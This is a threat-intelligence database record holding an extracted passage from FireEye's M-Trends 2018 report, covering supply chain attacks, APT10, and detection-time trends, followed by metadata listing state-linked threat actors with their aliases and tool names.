not\nexpect malicious code to be introduced by updates from\ntrusted software vendors. In supply chain attacks, cyber\nthreat groups target the build servers, update servers and\nother parts of the development or release environment.\nThe hackers then inject malware into software releases,\ninfecting users through official software distribution\nchannels. This attack method allows attackers to target\nbroad set of potential victims while obfuscating their\nintended target(s).\n\nIn 2017, FireEye observed at least five cases where\nadvanced threat actors compromised software companies\nto target users of the software. FireEye assesses that\nadvanced attackers will likely continue to leverage the\nsoftware supply chain to conduct cyber espionage.\n\n\n**Chinese threat group APT10 targets**\nIT service providers worldwide,\nincluding accessing victim networks\nthrough U.S.-based managed security\nservice providers (MSSP). APT10 spear\nphishing emails have been relatively\nunsophisticated, leveraging link (“.lnk”)\nfiles within archives, files with two\nextensions, and in some cases, simply\nidentically named decoy documents\nand malicious launchers within the\n\n\n**Chinese cyber espionage operators modified**\nthe software packages of a legitimate vendor,\nNetSarang Computer, allowing access to a\nbroad range of industries and institutions\nthat include financial services, transportation,\ntelecommunications, energy, media, academic,\nretail, and gaming. Likewise, in June 2017,\n**suspected Russian actors deployed NotPetya**\nransomware to various European targets by\ncompromising Ukrainian software vendor\nM E Doc\n\n\nseen a surge in cyber espionage campaigns targeting\nbusiness-to-business services such as cloud providers,\ntelecommunications companies and law firms. Attacking\nservice providers could allow Beijing to collect intelligence\non a broad group of targets in a manner that is less likely\nto be detected.\n\n**Chinese threat group APT10**\nIT service providers worldwide,\n\n###### APT10\n\nfiles within archives, files with two\n\n\n-----\n\n## CONCLUSION \n\n\nSome of the newest trends we observed in 2017 include\nincreased activity and sophistication from Iran, and an\nincrease in the retargeting of previously compromised\norganizations. However, these are simply evolutions\nof cyber security constants: threat actors from various\nnations with diverse motivations will continue to attack,\nand defenders will be tasked with stopping those\nthreats and doing everything they can – and that is\nrequired – to protect their customers.\n\n\n-----\n\nOne of the highlights from our data is the global median\ntime for internal detection dropping by over three weeks,\nfrom 80 days in 2016 to 57.5 days in 2017. Although the\nglobal median time from compromise to discovery has\nrisen by two days, we see that organizations are getting\nbetter at discovering compromises in-house with their own\ninternal teams.\n\nOf course, there is still work to be done. The cyber security\nskills gap that has existed for some time now appears to\nbe widening, bringing with it a rising demand for skilled\npersonnel capable of meeting the challenges posed by\ntoday’s highly skilled threat actors. For organizations\nlooking to improve their own security teams, Red Team\nAssessments can help. Mandiant’s red team engagements\ninvolve leveraging sophisticated attacker TTPs to breach\norganizations as a learning experience. As a result,\ndefenders can gain valuable insight into what they should\nbe doing to stay ahead of today’s most prominent threats.\n\n\nWhile it’s important to focus on new and evolving threats,\nwe also urge security professionals to never neglect best\npractices such as network segmentation, data segregation\nand protecting their most sensitive information. It is also\njust as important to be ready and able to respond to an\nincident, since we all know it is a matter of “when,” not “if”\norganizations will experience an attack. We encourage\norganizations to hold incident response tabletop exercises\nto simulate typical intrusion scenarios. These exercises\nhelp expose participants – notably executives, legal\npersonnel and other staff – to incident response processes\nand concepts. Additionally, organizations may want to\nconsider partnering with professionals that specialize in\ndefending against threats specific to the business.\n\nDefenders have to get it right every single time, while\nthreat actors only need to get it right once. By sharing\ninformation and solutions through M-Trends 2018 with\nthe security community, we continue to contribute to\nthe improvement of our collective security awareness,\nknowledge and capabilities.\n\n\n-----\n\n###### To learn more about FireEye, visit: www.FireEye.com\n\n\n**FireEye, Inc.**\n601 McCarthy Blvd. Milpitas, CA 95035\n408.321.6300/877.FIREEYE (347.3393)\n[info@FireEye.com](mailto:info%40FireEye.com?subject=)\n\n© 2018 FireEye, Inc. All rights reserved. FireEye is\na registered trademark of FireEye, Inc. All other\nbrands, products, or service names are or may be\nt d k i k f th i ti\n\n\n**About FireEye, Inc.**\nFireEye is the intelligence-led security company. Working as a\nseamless, scalable extension of customer security operations, FireEye\noffers a single platform that blends innovative security technologies,\nnation-state grade threat intelligence and world-renowned Mandiant®\nconsulting. With this approach, FireEye eliminates the complexity\nand burden of cyber security for organizations struggling to prepare\nfor, prevent and respond to cyber attacks. FireEye has over 6,600\ncustomers across 67 countries, including more than 45 percent of\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf"
    ],
    "report_names": [
        "mtrends-2018.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
            "created_at": "2022-10-25T16:07:24.133537Z",
            "updated_at": "2025-03-27T02:02:10.118581Z",
            "deleted_at": null,
            "main_name": "Rocket Kitten",
            "aliases": [
                "Group 83",
                "NewsBeef",
                "Newscaster",
                "Operation Newscaster",
                "Operation Woolen-GoldFish",
                "Parastoo",
                "Rocket Kitten"
            ],
            "source_name": "ETDA:Rocket Kitten",
            "tools": [
                "CoreImpact (Modified)",
                "FireMalv",
                "Ghole",
                "Gholee"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
            "created_at": "2023-01-06T13:46:38.748929Z",
            "updated_at": "2025-03-27T02:00:02.908256Z",
            "deleted_at": null,
            "main_name": "APT35",
            "aliases": [
                "Newscaster Team",
                "Magic Hound",
                "G0059",
                "Phosphorus",
                "Mint Sandstorm",
                "TunnelVision",
                "COBALT MIRAGE"
            ],
            "source_name": "MISPGALAXY:APT35",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ec14074c-8517-40e1-b4d7-3897f1254487",
            "created_at": "2023-01-06T13:46:38.300905Z",
            "updated_at": "2025-03-27T02:00:02.799108Z",
            "deleted_at": null,
            "main_name": "APT10",
            "aliases": [
                "TA429",
                "STONE PANDA",
                "POTASSIUM",
                "Red Apollo",
                "HOGFISH",
                "Cloud Hopper",
                "BRONZE RIVERSIDE",
                "ATK41",
                "G0045",
                "Menupass Team",
                "happyyongzi",
                "CVNX",
                "Granite Taurus"
            ],
            "source_name": "MISPGALAXY:APT10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ba3fff0c-3ba0-4855-9eeb-1af9ee18136a",
            "created_at": "2022-10-25T15:50:23.298889Z",
            "updated_at": "2025-03-27T02:00:55.433541Z",
            "deleted_at": null,
            "main_name": "menuPass",
            "aliases": [
                "menuPass",
                "POTASSIUM",
                "Stone Panda",
                "APT10",
                "Red Apollo",
                "CVNX",
                "HOGFISH",
                "BRONZE RIVERSIDE"
            ],
            "source_name": "MITRE:menuPass",
            "tools": [
                "certutil",
                "FYAnti",
                "UPPERCUT",
                "SNUGRIDE",
                "P8RAT",
                "RedLeaves",
                "SodaMaster",
                "pwdump",
                "Mimikatz",
                "PlugX",
                "PowerSploit",
                "ChChes",
                "cmd",
                "QuasarRAT",
                "AdFind",
                "Cobalt Strike",
                "PoisonIvy",
                "EvilGrab",
                "esentutl",
                "Impacket",
                "Ecipekac",
                "PsExec",
                "HUI Loader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9fe49a5b-f3e6-4fbf-99a1-db15dad460c3",
            "created_at": "2024-05-01T02:03:08.045004Z",
            "updated_at": "2025-03-27T02:05:17.325038Z",
            "deleted_at": null,
            "main_name": "COBALT TRINITY",
            "aliases": [
                "Elfin ",
                "HOLMIUM ",
                "MAGNALIUM ",
                "Peach Sandstorm ",
                "Refined Kitten ",
                "TA451 ",
                "APT33 "
            ],
            "source_name": "Secureworks:COBALT TRINITY",
            "tools": [
                " Cadlotcorg",
                " Dello RAT",
                " Imminent Monitor",
                " KDALogger",
                " Koadic",
                " NanoCore",
                " NetWire",
                " POWERTON",
                " PoshC2",
                " Poylog",
                " PupyRAT",
                " Schoolbag",
                "AutoCore"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ba9fa308-a29a-4928-9c06-73aafec7624c",
            "created_at": "2024-05-01T02:03:07.981061Z",
            "updated_at": "2025-03-27T02:05:17.28602Z",
            "deleted_at": null,
            "main_name": "BRONZE RIVERSIDE",
            "aliases": [
                "CTG-5938 ",
                "CVNX ",
                "Hogfish ",
                "MenuPass ",
                "POTASSIUM ",
                "Red Apollo ",
                "Stone Panda ",
                "APT10 "
            ],
            "source_name": "Secureworks:BRONZE RIVERSIDE",
            "tools": [
                " ChChes",
                " Cobalt Strike",
                " PlugX",
                " PoisonIvy",
                " QuasarRAT",
                " QuasarRAT Loader",
                " RedLeaves",
                "ANEL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b5b24083-7ba6-44cc-9d11-a6274e2eee00",
            "created_at": "2022-10-25T16:07:24.337332Z",
            "updated_at": "2025-03-27T02:02:10.177597Z",
            "deleted_at": null,
            "main_name": "Tortoiseshell",
            "aliases": [
                "Crimson Sandstorm",
                "Curium",
                "Houseblend",
                "Imperial Kitten",
                "Marcella Flores",
                "Operation Fata Morgana",
                "TA456",
                "Yellow Liderc"
            ],
            "source_name": "ETDA:Tortoiseshell",
            "tools": [
                "IMAPLoader",
                "Infostealer",
                "IvizTech",
                "LEMPO",
                "MANGOPUNCH",
                "SysKit",
                "get-logon-history.ps1",
                "liderc",
                "stereoversioncontrol"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
